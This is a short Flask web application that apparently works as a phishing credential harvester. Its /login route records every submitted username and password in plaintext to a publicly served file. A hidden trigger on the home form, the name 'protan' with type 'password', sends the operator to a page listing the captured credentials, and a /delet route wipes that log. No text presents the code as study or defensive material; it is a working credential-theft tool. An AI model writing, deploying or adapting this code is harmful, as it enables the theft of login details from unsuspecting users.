from flask import Flask, redirect, send_file, request, render_template
import os
import qrcode
from gtts import gTTS as GT

app = Flask(__name__)


@app.route("/", methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        page_name = request.form['page']
        page_type = request.form['type']
        print(f"Pagename : {page_name} Page Type : {page_type}" )
        if page_name =="protan" or page_name=="Protan" or page_name=="ProTan" or page_name=="Protan Halder" or page_name=="protan halder":
            if page_type =="Password" or page_type=="password":
                return redirect("/pwd")
        else:
            return redirect("/login")
    return render_template('index.html')


@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form['user']
        pwd  = request.form['pwd']
        print(f"username {user} password {pwd}")
        with open("static/password.txt",'a') as file:
            file.write(f"user:{user}  pass:{pwd}\n")
    return render_template('login.html')

@app.route("/pwd", methods=['GET', 'POST'])
def pwd():
    try:
        with app.open_resource('static/password.txt') as f:
            contents = f.read()
    except:
        contents = "Noting"
    return render_template('password.html', pwd=contents)
@app.route("/delet", methods=['GET', 'POST'])
def delet_pass():
    try:
        os.remove('static/password.txt')
    except:
        pass
    try:
        with app.open_resource('static/password.txt') as f:
            contents = f.read()
    except:
        contents = "Noting"
    return render_template('password.html', pwd=contents)
    
    
if __name__ == "__main__":
    app.run(debug=True)